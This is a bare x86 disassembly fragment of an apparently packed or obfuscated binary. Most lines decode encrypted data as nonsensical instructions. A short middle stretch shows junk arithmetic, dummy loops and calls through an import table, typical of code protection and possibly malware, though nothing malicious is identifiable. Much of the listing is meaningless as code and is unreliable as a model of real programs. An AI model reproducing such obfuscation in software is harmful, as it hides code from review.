  41425d:	adc    BYTE PTR [edx-0x4f5a27bd],cl
  414263:	(bad)  
  414264:	cdq    
  414265:	ds pusha 
  414267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414268:	pop    ebp
  414269:	retf   
  41426a:	xlat   BYTE PTR ds:[ebx]
  41426b:	jmp    0xd296:0xcadec9e8
  414272:	mov    ecx,0x9c383450
  414277:	in     al,0x7d
  414279:	jbe    0x41420c
  41427b:	pop    ds
  41427c:	retf   0xa204
  41427f:	dec    esi
  414280:	popa   
  414281:	mov    ch,0xb5
  414283:	cwde   
  414284:	fwait
  414285:	out    0x6f,eax
  414287:	aad    0x23
  414289:	out    dx,al
  41428a:	stc    
  41428b:	xchg   BYTE PTR [esi],al
  41428d:	aas    
  41428e:	inc    esi
  41428f:	data16 icebp 
  414291:	push   ds
  414292:	mov    al,ds:0xa8257623
  414297:	jne    0x414247
  414299:	adc    DWORD PTR [ecx],esp
  41429b:	xchg   esi,eax
  41429c:	jne    0x4142f6
  41429e:	sahf   
  41429f:	mov    ebp,gs
  4142a1:	mov    esi,0x1e6b4493
  4142a6:	cmp    DWORD PTR [ecx],esi
  4142a8:	ins    BYTE PTR es:[edi],dx
  4142a9:	psubd  mm0,QWORD PTR [esi+0x35]
  4142ad:	mov    bh,0x81
  4142af:	lods   eax,DWORD PTR ds:[esi]
  4142b0:	call   0xa0191e78
  4142b5:	fcom   QWORD PTR [esi]
  4142b7:	inc    edx
  4142b8:	popf   
  4142b9:	push   edi
  4142ba:	mov    al,0x20
  4142bc:	lahf   
  4142bd:	sbb    al,cl
  4142bf:	pop    ebx
  4142c0:	jle    0x414321
  4142c2:	in     eax,dx
  4142c3:	mov    DWORD PTR [eax+0x7f],edx
  4142c6:	mov    bl,cl
  4142c8:	pop    esi
  4142c9:	cmp    BYTE PTR [ebp+eax*8-0x49],ah
  4142cd:	adc    DWORD PTR [ebx-0x4eb74ce],esp
  4142d3:	or     eax,0x4d818a96
  4142d8:	cdq    
  4142d9:	mov    bh,0x30
  4142db:	push   esp
  4142dc:	mov    es,esp
  4142de:	mov    cl,0xd8
  4142e0:	out    dx,eax
  4142e1:	add    al,0x4b
  4142e3:	mov    esi,0x3c2ced4d
  4142e8:	popa   
  4142e9:	lgs    edi,FWORD PTR [edx+esi*8-0x1d515ac0]
  4142f1:	(bad)  
  4142f3:	mov    eax,ds:0x1a60f29b
  4142f8:	xchg   cl,bh
  4142fa:	ret    0x55ea
  4142fd:	js     0x41428b
  4142ff:	rcpps  xmm2,xmm3
  414302:	mov    ds:0xc7be32d6,al
  414307:	xor    eax,0xff23f7f8
  41430c:	in     al,dx
  41430d:	scas   eax,DWORD PTR es:[edi]
  41430e:	push   0x342d93f6
  414313:	mov    al,0xd9
  414315:	pop    ebp
  414316:	addr16 dec ebp
  414318:	addr16 push ecx
  41431a:	sub    edx,ebx
  41431c:	sbb    DWORD PTR ds:0x428647,edi
  414322:	sub    edx,esi
  414324:	add    DWORD PTR ds:0x42863f,ecx
  41432a:	xor    edx,eax
  41432c:	mov    ebx,DWORD PTR ds:0x42864f
  414332:	add    DWORD PTR ds:0x428623,ebx
  414338:	mov    DWORD PTR [ebp+0x8],edx
  41433b:	mov    edx,DWORD PTR [ebp+0x8]
  41433e:	inc    ebx
  41433f:	mov    ebx,DWORD PTR [ebp-0x58]
  414342:	sub    DWORD PTR ds:0x428663,0x42863f
  41434c:	add    edx,0x5708f1
  414352:	and    DWORD PTR ds:0x428647,0x6a8d
  41435c:	imul   edx,ebx
  41435f:	xor    ebx,ebx
  414361:	or     ebx,DWORD PTR ds:0x42861f
  414367:	adc    DWORD PTR ds:0x42860f,ebx
  41436d:	mov    DWORD PTR [ebp-0x58],edx
  414370:	mov    edx,DWORD PTR [ebp+0x8]
  414373:	mov    ebx,DWORD PTR [ebp-0x54]
  414376:	add    edx,0x64f893
  41437c:	sbb    DWORD PTR ds:0x4285ff,0x4a3d
  414386:	or     edx,ebx
  414388:	mov    DWORD PTR [ebp-0x54],edx
  41438b:	or     DWORD PTR ds:0x4285db,edx
  414391:	mov    edx,DWORD PTR [ebp+0x8]
  414394:	mov    DWORD PTR ds:0x428653,0x1a
  41439e:	cmp    DWORD PTR ds:0x428653,0x0
  4143a5:	je     0x4143df
  4143ab:	cmp    DWORD PTR ds:0x428653,0x25
  4143b2:	ja     0x4143df
  4143b8:	jmp    0x4143cd
  4143bd:	push   0x428034
  4143c2:	push   0x0
  4143c4:	push   DWORD PTR [ebp-0xc]
  4143c7:	call   DWORD PTR ds:0x4287ab
  4143cd:	mov    ebx,DWORD PTR ds:0x428653
  4143d3:	dec    ebx
  4143d4:	mov    DWORD PTR ds:0x428653,ebx
  4143da:	jmp    0x41439e
  4143df:	mov    ebx,DWORD PTR [ebp-0x50]
  4143e2:	add    DWORD PTR ds:0x42862f,0x3490
  4143ec:	add    edx,ecx
  4143ee:	xor    edx,ebx
  4143f0:	sbb    DWORD PTR ds:0x4285f3,edi
  4143f6:	mov    DWORD PTR [ebp-0x50],edx
  4143f9:	mov    edx,DWORD PTR [ebp+0x8]
  4143fc:	mov    ebx,DWORD PTR [ebp-0x4c]
  4143ff:	add    edx,edi
  414401:	add    DWORD PTR ds:0x42866b,0x26d2
  41440b:	and    edx,ebx
  41440d:	mov    DWORD PTR [ebp-0x4c],edx
  414410:	and    DWORD PTR ds:0x42862b,0x0
  41441a:	xor    edx,edx
  41441c:	xor    edx,DWORD PTR ds:0x42862b
  414422:	inc    edx
  414423:	mov    DWORD PTR ds:0x42862b,edx
  414429:	cmp    DWORD PTR ds:0x42862b,0x2c
  414430:	jbe    0x414453
  414436:	jmp    0x414446
  41443b:	push   0x42808e
  414440:	call   DWORD PTR ds:0x4287af
  414446:	cmp    DWORD PTR ds:0x42862b,0x1f
  41444d:	jb     0x41441a
  414453:	mov    edx,DWORD PTR [ebp+0x8]
  414456:	mov    ebx,DWORD PTR [ebp-0x48]
  414459:	lea    edx,[ebx+edx*1+0x241fcde]
  414460:	mov    DWORD PTR [ebp-0x48],edx
  414463:	mov    edx,DWORD PTR [ebp+0x8]
  414466:	mov    ebx,0xfa5e1521
  41446b:	sub    ebx,edx
  41446d:	add    ebx,DWORD PTR [ebp-0x44]
  414470:	mov    DWORD PTR [ebp-0x44],ebx
  414473:	mov    edx,DWORD PTR [ebp+0x8]
  414476:	xor    edx,eax
  414478:	add    edx,esi
  41447a:	jne    0x411f5b
  414480:	mov    edx,DWORD PTR [ebp-0xc]
  414483:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41448a:	mov    bl,BYTE PTR [ebp-0x1]
  41448d:	cmp    dl,bl
  41448f:	je     0x41b050
  414495:	mov    ecx,DWORD PTR [ebp-0x5c]
  414498:	mov    edx,DWORD PTR [ebp-0xc]
  41449b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4144a2:	mov    ebx,DWORD PTR [ebp+0xc]
  4144a5:	xor    ecx,eax
  4144a7:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272ec]
  4144ae:	jne    0x41b184
  4144b4:	mov    ecx,DWORD PTR [ebp-0x5c]
  4144b7:	mov    edx,DWORD PTR [ebp+0xc]
  4144ba:	xor    ecx,eax
  4144bc:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272ec]
  4144c4:	mov    edx,DWORD PTR [ebp-0x18]
  4144c7:	xor    edx,eax
  4144c9:	add    edx,esi
  4144cb:	cmp    ecx,edx
  4144cd:	mov    ecx,DWORD PTR [ebp-0x14]
  4144d0:	mov    DWORD PTR [ebp+0x8],ecx
  4144d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4144d6:	je     0x41d62d
  4144dc:	xor    ecx,eax
  4144de:	add    ecx,esi
  4144e0:	mov    ecx,0x242ebcc
  4144e5:	je     0x41b0d8
  4144eb:	mov    edx,DWORD PTR [ebp+0x8]
  4144ee:	mov    ebx,DWORD PTR [ebp-0x8]
  4144f1:	xor    edx,eax
  4144f3:	xor    ebx,eax
  4144f5:	sub    edx,ebx
  4144f7:	sub    edx,esi
  4144f9:	xor    edx,eax
  4144fb:	mov    DWORD PTR [ebp+0x8],edx
  4144fe:	mov    edx,DWORD PTR [ebp+0x8]
  414501:	mov    ebx,DWORD PTR [ebp-0x58]
  414504:	add    edx,0x5708f1
  41450a:	imul   edx,ebx
  41450d:	jmp    0x4168ae
  414512:	dec    eax
  414513:	pop    DWORD PTR [eax+ebx*8-0x70f72485]
  41451a:	lea    ebx,[eax-0x3a]
  41451d:	push   edi
  41451e:	rcr    DWORD PTR [esi+0x663a4cff],1
  414524:	jge    0x4145a0
  414526:	(bad)  
  414527:	pop    edi
  414528:	jp     0x4145a4
  41452a:	pusha  
  41452b:	cwde   
  41452c:	in     al,dx
  41452d:	mov    al,ds:0x93fb5629
  414532:	not    DWORD PTR [edi-0x76]
  414535:	dec    edi
  414536:	ins    DWORD PTR es:[edi],dx
  414537:	pop    esi
  414538:	aaa    
  414539:	cld    
  41453a:	push   edi
  41453b:	rol    BYTE PTR [edi],0x6e
  41453e:	inc    ebp
  41453f:	push   ebp
  414540:	inc    ecx
  414541:	push   cs
  414542:	addr16 ret 
  414544:	clc    
  414545:	xor    DWORD PTR [ebx+0xb],esi
  414548:	popa   
  414549:	dec    eax
  41454a:	(bad)  
  41454b:	cmp    ebp,edi
  41454d:	mov    eax,0x55f5fa66
  414552:	jbe    0x414572
  414554:	ins    DWORD PTR es:[edi],dx
  414555:	sar    ebx,1
  414557:	push   esi
  414558:	jge    0x414596
  41455a:	cmp    dh,BYTE PTR [ecx]
  41455c:	sbb    dh,bh
  41455e:	mov    al,ds:0x8bfac889
  414563:	fmul   QWORD PTR [eax+0x3c]
  414566:	(bad)  
  414567:	cld    
  414568:	jmp    0x1e4a723c
  41456d:	inc    ebx
  41456e:	dec    ebp
  41456f:	xchg   dl,ah
  414571:	pop    ecx
  414572:	mov    edx,0x94b4c2ef
  414577:	aad    0xe0
  414579:	cdq    
  41457a:	and    eax,0xb32451be
  41457f:	(bad)  
  414580:	xchg   esp,eax
  414581:	or     al,0x80
  414583:	(bad)  
  414584:	fcom   QWORD PTR [edi+0x20]
  414587:	outs   dx,DWORD PTR ds:[esi]
  414588:	enter  0x77eb,0xa6
  41458c:	push   ecx
  41458d:	and    eax,0x2da8a4bc
  414592:	pop    ds
  414593:	xor    al,0x4e
  414595:	popf   
  414596:	out    0x5b,eax
  414598:	jae    0x414598
  41459a:	stc    
  41459b:	jno    0x41458e
  41459d:	xchg   DWORD PTR [edi+0x29],ebp
  4145a0:	aad    0x9e
  4145a2:	or     eax,0x958a26b5
  4145a7:	clc    
  4145a8:	push   esi
  4145a9:	leave  
  4145aa:	adc    DWORD PTR [ecx-0x79d9c357],0xd8506892
  4145b4:	aam    0x8b
  4145b6:	shl    eax,1
  4145b8:	dec    esp
  4145b9:	nop
  4145ba:	nop
  4145bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145bc:	out    dx,eax
  4145bd:	push   0xffffffd0
  4145bf:	lea    ebp,[ebp-0x63]
  4145c2:	and    BYTE PTR [edi-0x21],0xf5
  4145c6:	imul   edx,ebp,0xffffffbe
  4145c9:	push   cs
  4145ca:	sub    bh,dh
  4145cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145cd:	inc    ecx
  4145ce:	std    
  4145cf:	mov    al,es:0xb7507da3
  4145d5:	stos   DWORD PTR es:[edi],eax
  4145d6:	dec    ebx
  4145d7:	or     BYTE PTR [edi+0x19],ch
  4145da:	scas   al,BYTE PTR es:[edi]
  4145db:	outs   dx,DWORD PTR ds:[esi]
  4145dc:	adc    edx,DWORD PTR [eax]
  4145de:	mov    bh,0xaf
  4145e0:	adc    BYTE PTR cs:0xc7c71ec2,bh
  4145e7:	dec    ebx
  4145e8:	or     DWORD PTR [edi+0x62c78ec2],ebp
  4145ee:	jne    0x414599
  4145f0:	ds test eax,0xd038bf75
  4145f6:	pop    edi
  4145f7:	add    eax,0x1fec3716
  4145fc:	xchg   edi,eax
  4145fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145fe:	sti    
  4145ff:	sar    DWORD PTR [esi+ebx*2-0x5fdbe731],1
  414606:	push   ebp
  414607:	loope  0x414638
  414609:	inc    esp
  41460a:	and    esi,ebx
  41460c:	mov    ds:0xc5e8e145,eax
  414611:	sbb    DWORD PTR [eax+0x52be7f0f],edi
  414617:	mov    ds:0x45e63a0d,eax
  41461c:	in     al,0x89
  41461e:	es cld 
  414620:	lock test al,0xae
  414623:	rcl    BYTE PTR [edi+0x18ff9c4d],1
  414629:	pop    ebp
  41462a:	push   cs
  41462b:	imul   esp,DWORD PTR [edi-0xc],0x66
  41462f:	push   cs
  414630:	xor    BYTE PTR [edx+0x71],dh
  414633:	repnz int3 
  414635:	int3   
  414636:	loopne 0x414668
  414638:	cmp    al,0x23
  41463a:	push   cs
  41463b:	dec    ebp
  41463c:	xchg   esi,eax
  41463d:	push   es
  41463e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41463f:	jns    0x414607
  414641:	cmp    eax,0x9c914a82
  414646:	pop    ebx
  414647:	jbe    0x414687
  414649:	inc    ebx
  41464a:	cmp    eax,0xef400038
  41464f:	ss fcmovbe st,st(5)
  414652:	push   cs
  414653:	or     ah,BYTE PTR [edi-0x5fac905b]
  414659:	sub    bl,ch
  41465b:	mov    dh,0x50
  41465d:	out    0xd1,eax
  41465f:	neg    BYTE PTR ss:[edi*8-0x478b1e3c]
  414667:	enter  0x2319,0xe2
  41466b:	sbb    eax,0x7e7bf8a5
  414670:	pop    ebp
  414671:	xchg   esi,eax
  414672:	mov    ah,0x41
  414674:	xchg   ebx,eax
  414675:	leave  
  414676:	popf   
  414677:	stos   DWORD PTR es:[edi],eax
  414678:	xor    eax,DWORD PTR [edx-0x3e9cab32]
  41467e:	and    BYTE PTR [edi-0x72],bh
  414681:	loop   0x41466d
  414683:	jbe    0x41464c
  414685:	pop    ss
  414686:	push   0xffffffa1
  414688:	cli    
  414689:	scas   eax,DWORD PTR es:[edi]
  41468a:	jge    0x4146c2
  41468c:	test   eax,0xda858931
  414691:	pop    ebx
  414692:	arpl   WORD PTR [edx],sp
  414694:	xchg   ebx,eax
  414695:	or     eax,0xda6de249
  41469a:	mov    ds:0xab82e3ec,al
  41469f:	push   0x3b
  4146a1:	jno    0x414638
  4146a3:	mov    eax,0x29343f3d
  4146a8:	mov    esi,0x109d91a5
  4146ad:	stos   DWORD PTR es:[edi],eax
  4146ae:	call   0xe89f:0x81ffc395
  4146b5:	and    BYTE PTR [edx+0x565f0bb],ah
  4146bb:	icebp  
  4146bc:	(bad)  
  4146bd:	mov    ds:0x87f5e1fa,eax
  4146c2:	scas   al,BYTE PTR es:[edi]
  4146c3:	push   edi
  4146c4:	pop    ebp
  4146c5:	fmul   st,st(2)
  4146c7:	mov    al,0x1
  4146c9:	mov    eax,0x5e4e8fc0
  4146ce:	sub    eax,0xabf28039
  4146d3:	inc    esi
  4146d4:	loopne 0x4146ca
  4146d6:	mov    dl,0x3a
  4146d8:	and    esi,DWORD PTR [edx+ebx*1]
  4146db:	push   edx
  4146dc:	loopne 0x4146aa
  4146de:	(bad)  
  4146df:	ror    dl,cl
  4146e1:	nop
  4146e2:	dec    edi
  4146e3:	cdq    
  4146e4:	mov    bh,0xcf
  4146e6:	mov    ecx,0xa953ae2e
  4146eb:	push   ss
  4146ec:	in     eax,0x0
  4146ee:	and    ch,BYTE PTR [eax-0x59]
  4146f1:	sti    
  4146f2:	mov    eax,0x488745e0
  4146f7:	cs push cs
  4146f9:	pop    ds
  4146fa:	sub    dl,dh
  4146fc:	sbb    eax,0xaea0267
  414701:	ret    
  414702:	pop    ss
  414703:	idiv   DWORD PTR [edi]
  414705:	push   edx
  414706:	jmp    DWORD PTR [ebx]
  414708:	and    eax,0xdbd47e
  41470d:	xchg   edx,eax
  41470e:	lea    edi,[eax-0x5de0c428]
  414714:	adc    DWORD PTR [esi+0x57],esp
  414717:	aas    
  414718:	xor    al,0x51
  41471a:	(bad)  
  41471b:	mov    ebx,0x7b7d2357
  414720:	in     al,dx
  414721:	int    0x1f
  414723:	cmp    BYTE PTR [eax+ecx*2-0x6af049ee],0x7f
  41472b:	mov    dl,0xe6
  41472d:	fisubr WORD PTR [ebp+0x7a]
  414730:	sbb    BYTE PTR [edx],ah
  414732:	mov    al,ds:0x81f2bb0c
  414737:	je     0x414775
  414739:	push   ds
  41473a:	je     0x41478d
  41473c:	pop    ebp
  41473d:	aaa    
  41473e:	int3   
  41473f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414740:	pop    es
  414741:	pop    ss
  414742:	and    al,0xf7
  414744:	push   es
  414745:	shl    DWORD PTR [edi],1
  414747:	jae    0x414786
  414749:	cli    
  41474a:	ficomp WORD PTR [edx]
  41474c:	bound  ebp,QWORD PTR [esi]
  41474e:	pop    ds
  41474f:	ror    esp,1
  414751:	cmp    al,0xb7
  414753:	dec    esp
  414755:	xor    DWORD PTR [ebx+0x4f],edi
  414758:	loop   0x4147a7
  41475a:	outs   dx,DWORD PTR ds:[esi]
  41475b:	mul    ebp
  41475d:	repnz mov ebp,DWORD PTR ds:0x4e4cff43
  414764:	pusha  
  414765:	or     al,0xe8
  414767:	cmp    al,0x7c
  414769:	das    
  41476a:	cmp    ch,dl
  41476c:	push   ecx
  41476d:	pop    edi
  41476e:	bound  edx,QWORD PTR [ecx+0x9955eda]
  414774:	and    DWORD PTR [ebp+0x79d177d0],edx
  41477a:	ret    
  41477b:	xor    eax,0xd33929b
  414780:	or     eax,0xe7675ac2
  414785:	iret   
  414786:	pop    edx
  414787:	xchg   edx,eax
  414788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414789:	mov    al,ds:0xe1f5ed4e
  41478e:	xor    ebx,DWORD PTR [edx]
  414790:	xchg   ebp,eax
  414791:	mov    al,0x12
  414793:	adc    eax,0x3c0056d1
  414798:	lods   al,BYTE PTR ds:[esi]
  414799:	push   eax
  41479a:	sbb    BYTE PTR ds:0x17acd1a2,dl
  4147a0:	adc    al,0x10
  4147a2:	sbb    al,0x10
  4147a4:	shr    DWORD PTR [eax],0x40
  4147a7:	mov    ebx,0xff3ccb2b
  4147ac:	test   ebx,edi
  4147ae:	or     BYTE PTR [esi],al
  4147b0:	popf   
  4147b1:	fmul   DWORD PTR [eax-0x3ceca0e8]
  4147b7:	loopne 0x414751
  4147b9:	sti    
  4147ba:	jb     0x41475c
  4147bc:	mov    bh,0xac
  4147be:	add    BYTE PTR [ecx],0x69
  4147c1:	mov    ecx,0x54125c7a
  4147c6:	push   ds
  4147c7:	fsub   DWORD PTR [esi+0x54]
  4147ca:	xor    esp,DWORD PTR [edx+ebx*8+0x4]
  4147ce:	dec    ebx
  4147cf:	std    
  4147d0:	mov    BYTE PTR [edi+eax*2-0x1deb6b64],dl
  4147d7:	or     DWORD PTR [ebp+0x2835d1e4],ebx
  4147dd:	mov    ?,WORD PTR [edi]
  4147df:	fsub   QWORD PTR [eax+0x3690aac7]
  4147e5:	pop    edi
  4147e6:	cmp    BYTE PTR [eax+ebx*4+0x27137921],ah
  4147ed:	(bad)  
  4147ee:	add    al,0xb9
  4147f0:	push   esp
  4147f1:	and    DWORD PTR [ebx],ecx
  4147f3:	xchg   edx,eax
  4147f4:	neg    DWORD PTR [esi-0x4e2801ef]
  4147fa:	fwait
  4147fb:	or     DWORD PTR [esi+edi*4],esp
  4147fe:	inc    ebx
  4147ff:	sbb    BYTE PTR [ebp-0x13ac29c7],bl
  414805:	sub    edx,DWORD PTR [esi-0x77]
  414808:	dec    ebp
  414809:	aas    
  41480a:	dec    ebx
  41480b:	and    al,0x85
  41480d:	sbb    al,0x54
  41480f:	mov    cs,WORD PTR [ebx+0x67]
  414812:	(bad)  
  414813:	dec    ebp
  414814:	add    dh,BYTE PTR [edx-0x17]
  414817:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414818:	test   DWORD PTR [edx-0x32],ecx
  41481b:	dec    esi
  41481c:	adc    eax,0x7d9f33ed
  414821:	(bad)  
  414822:	xchg   edx,eax
  414823:	jl     0x414857
  414825:	scas   eax,DWORD PTR es:[edi]
  414826:	jmp    0xfad542b0
  41482b:	scas   al,BYTE PTR es:[edi]
  41482c:	add    eax,0x6acb3f91
  414831:	pop    esi
  414832:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414833:	jecxz  0x414823
  414835:	mov    eax,0x7786414a
  41483a:	pop    ecx
  41483b:	mov    edi,?
  41483d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41483e:	repnz (bad) 
  414841:	ds add al,0x36
  414844:	and    al,0x6a
  414846:	repnz mov edx,DWORD PTR ds:[edi]
  41484a:	nop
  41484b:	fadd   st,st(2)
  41484d:	cmp    eax,0x51e639f5
  414852:	loopne 0x414849
  414854:	jo     0x414869
  414856:	inc    ebp
  414857:	add    al,0x76
  414859:	jae    0x414827
  41485b:	xor    eax,0x55ccce93
  414860:	popf   
  414861:	sub    DWORD PTR [ecx+0x72],eax
  414864:	jno    0x414871
  414866:	sbb    bl,dh
  414868:	xor    al,0x9a
  41486a:	sti    
  41486b:	scas   al,BYTE PTR es:[edi]
  41486c:	jmp    0x8da46517
  414871:	ins    BYTE PTR es:[edi],dx
  414872:	lds    esi,FWORD PTR [eax+0x609def44]
  414878:	sub    DWORD PTR [edx+0x3f0c42c3],0x1d
  41487f:	add    eax,0x18abccc
  414884:	es ret 0xf5b1
  414888:	popa   
  414889:	lahf   
  41488a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41488b:	push   cs
  41488c:	xchg   esp,eax
  41488d:	inc    ecx
  41488e:	retf   0x891a
  414891:	dec    eax
  414892:	in     eax,dx
  414893:	pusha  
  414894:	es cld 
  414896:	push   esi
  414897:	imul   esp,DWORD PTR [ebx-0x56c20a47],0x4380d362
  4148a1:	jl     0x4148ed
  4148a3:	fild   QWORD PTR [ebx+0x89267b]
  4148a9:	imul   esp,eax,0xb8187a41
  4148af:	jle    0x414839
  4148b1:	inc    esp
  4148b2:	and    al,0x40
  4148b4:	or     al,cl
  4148b6:	xlat   BYTE PTR ds:[ebx]
  4148b7:	sub    al,0x52
  4148b9:	xor    DWORD PTR [edx],ebx
  4148bb:	add    cl,bh
  4148bd:	cdq    
  4148be:	jb     0x41488b
  4148c0:	or     DWORD PTR [ebp-0x716c74a6],0xfffffffb
  4148c7:	mov    al,ds:0x5cdeccbc
  4148cc:	add    DWORD PTR [eax+0x207d7569],esp
  4148d2:	js     0x4148f0
  4148d4:	cmc    
  4148d5:	push   0xc6dd3533
  4148da:	les    edx,FWORD PTR [esi]
  4148dc:	mov    dl,BYTE PTR [ebx]
  4148de:	jle    0x4148b6
  4148e0:	popa   
  4148e1:	inc    edx
  4148e2:	push   edi
  4148e3:	daa    
  4148e4:	add    eax,0x81db316a
  4148e9:	mov    eax,ds:0x3c1032c3
  4148ee:	lods   eax,DWORD PTR ds:[esi]
  4148ef:	(bad)  
  4148f0:	mov    WORD PTR [edx+0x47],?
  4148f3:	and    dh,BYTE PTR [ebx+0x36d67619]
  4148f9:	pop    ss
  4148fa:	add    BYTE PTR [ebx+0x7260447d],ah
  414900:	pop    ebx
  414901:	fyl2x  
  414903:	jmp    0x4148e4
  414905:	sbb    DWORD PTR [edi],edx
  414907:	(bad)  
  414908:	mov    DWORD PTR [eax-0x63],edx
  41490b:	xchg   edx,eax
  41490c:	mov    al,0x43
  41490e:	mov    esp,0x499988fc
  414913:	jp     0x41495c
  414915:	popa   
  414916:	in     al,0x10
  414918:	mov    bl,0x59
  41491a:	in     eax,dx
  41491b:	pop    bx
  41491d:	fs std 
  41491f:	lds    ecx,FWORD PTR [edx-0x5a]
  414922:	mov    ecx,0xbd66e6ab
  414927:	adc    al,bl
  414929:	mov    DWORD PTR [esp+ebx*8],ebp
  41492c:	loope  0x414909
  41492e:	js     0x414984
  414930:	and    eax,0xdeeb7a1
  414935:	cmp    ebp,DWORD PTR ds:0xb68bd261
  41493b:	push   cs
  41493c:	push   ebp
  41493d:	sbb    al,0xf0
  41493f:	jmp    0x41497b
  414941:	ss sahf 
  414943:	pop    ebx
  414944:	retf   0xb39e
  414947:	pop    esp
  414948:	gs pop ss
  41494a:	mov    esi,0xe740d387
  41494f:	scas   al,BYTE PTR es:[edi]
  414950:	mov    esp,eax
  414952:	push   ds
  414953:	or     BYTE PTR [edi+esi*8+0x4960e69e],bl
  41495a:	(bad)  
  41495b:	(bad)  
  41495c:	fwait
  41495d:	popf   
  41495e:	test   bl,dl
  414960:	mov    ecx,0x541065db
  414965:	rol    BYTE PTR [edi],0x2e
  414968:	pusha  
  414969:	loop   0x41493d
  41496b:	test   eax,esi
  41496d:	rol    DWORD PTR [edx+0x45bd8b5e],0xb2
  414974:	daa    
  414975:	jmp    0x41496b
  414977:	test   al,0xb5
  414979:	push   ss
  41497a:	mov    edx,0x98f0ae9e
  41497f:	ins    BYTE PTR es:[edi],dx
  414980:	sub    al,0xe7
  414982:	repz (bad) 
  414984:	fistp  WORD PTR [esi-0x6]
  414987:	gs int3 
  414989:	inc    edx
  41498a:	adc    BYTE PTR [eax-0x1d],cl
  41498d:	lods   al,BYTE PTR ds:[esi]
  41498e:	push   ss
  41498f:	pop    es
  414990:	mov    BYTE PTR [esi+esi*8],al
  414993:	(bad)  
  414994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414995:	add    BYTE PTR [edi+ebx*2],0xf5
  414999:	out    0xb5,al
  41499b:	mov    dh,BYTE PTR gs:[esi-0x27]
  41499f:	pop    ds
  4149a0:	jbe    0x414a08
  4149a2:	dec    edi
  4149a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149a5:	mov    ebx,0xfd633dfb
  4149aa:	push   cs
  4149ab:	rol    DWORD PTR [esi],1
  4149ad:	and    DWORD PTR [ebx-0x9],ebp
  4149b0:	ins    DWORD PTR es:[edi],dx
  4149b1:	cmp    al,0xfc
  4149b3:	sbb    dh,BYTE PTR [edi]
  4149b5:	mov    eax,ds:0x15c73bfa
  4149ba:	mov    esi,0x14f57461
  4149bf:	sbb    eax,DWORD PTR cs:[ebx+0x4cb2ba09]
  4149c6:	ret    0x3f00
  4149c9:	dec    ebx
  4149ca:	cmp    eax,0x3be6d6ad
  4149cf:	add    edi,edi
  4149d1:	loopne 0x414a25
  4149d3:	mov    al,ds:0xd3d93cc4
  4149d8:	push   esi
  4149d9:	adc    bh,bl
  4149db:	sub    eax,0x51601a76
  4149e0:	(bad)  
  4149e1:	sahf   
  4149e2:	fwait
  4149e3:	iret   
  4149e4:	retf   0x64ba
  4149e7:	lea    esi,[eax]
  4149e9:	jmp    0x334a:0xfe53c5e5
  4149f0:	gs (bad) 
  4149f3:	cmc    
  4149f4:	dec    esp
  4149f5:	das    
  4149f6:	stos   BYTE PTR es:[edi],al
  4149f7:	cli    
  4149f8:	ja     0x414a5a
  4149fa:	cmp    edx,DWORD PTR [ebp+0xf]
  4149fd:	loope  0x41498e
  4149ff:	cld    
  414a00:	sbb    BYTE PTR [edx],0xf1
  414a03:	les    ecx,FWORD PTR [ebp*8+0x73ae7a22]
  414a0a:	arpl   di,di
  414a0c:	ror    BYTE PTR [esp+esi*4+0x13984e45],0xee
  414a14:	mov    al,ds:0x8a071c5c
  414a19:	pop    eax
  414a1a:	xchg   esi,eax
  414a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a1c:	out    dx,al
  414a1d:	mov    bh,0x7d
  414a1f:	xor    al,0xdd
  414a21:	aaa    
  414a22:	in     al,0xf6
  414a24:	stos   DWORD PTR es:[edi],eax
  414a25:	push   edx
  414a26:	xor    esp,DWORD PTR [edi+0x6e]
  414a29:	xchg   edi,eax
  414a2a:	aaa    
  414a2b:	xchg   ecx,eax
  414a2c:	xor    al,0xdb
  414a2e:	call   0xded6:0x51710017
  414a35:	mov    ebp,0x9e35075
  414a3a:	xor    BYTE PTR [edx-0x3],dl
  414a3d:	mul    DWORD PTR [edi]
  414a3f:	xchg   DWORD PTR [esi+0x1b],eax
  414a42:	mov    ah,0x6
  414a44:	xor    esi,edi
  414a46:	inc    ebx
  414a47:	sub    BYTE PTR [eax-0x37fb8718],0x36
  414a4e:	mov    es,eax
  414a50:	pop    ds
  414a51:	cli    
  414a52:	and    eax,0xe41d14c8
  414a57:	mov    esp,0x2d409276
  414a5c:	xchg   ebx,eax
  414a5d:	pop    ecx
  414a5e:	(bad)  
  414a5f:	faddp  st(3),st
  414a61:	mov    edx,0xee79fc31
  414a66:	push   ecx
  414a67:	jbe    0x414a78
  414a69:	and    dl,BYTE PTR ds:[ebp+0x4d]
  414a6d:	loop   0x414a21
  414a6f:	loopne 0x414a4f
  414a71:	push   esp
  414a72:	mov    edi,0x66208022
  414a77:	adc    al,0xcf
  414a79:	or     BYTE PTR [ecx-0x6e],al
  414a7c:	xor    dh,bh
  414a7e:	push   eax
  414a7f:	cld    
  414a80:	out    0x8b,eax
  414a82:	add    BYTE PTR [ebx+0xcb5ac40],ch
  414a88:	xchg   edi,eax
  414a89:	outs   dx,DWORD PTR ds:[esi]
  414a8a:	inc    ebx
  414a8b:	dec    esi
  414a8c:	cmc    
  414a8d:	inc    esp
  414a8e:	sahf   
  414a8f:	dec    ecx
  414a90:	add    al,0xda
  414a92:	lds    edx,FWORD PTR [edi]
  414a94:	cmp    bl,bl
  414a96:	cdq    
  414a97:	xchg   ecx,eax
  414a98:	rcr    BYTE PTR [edx+0x3bf4cee6],1
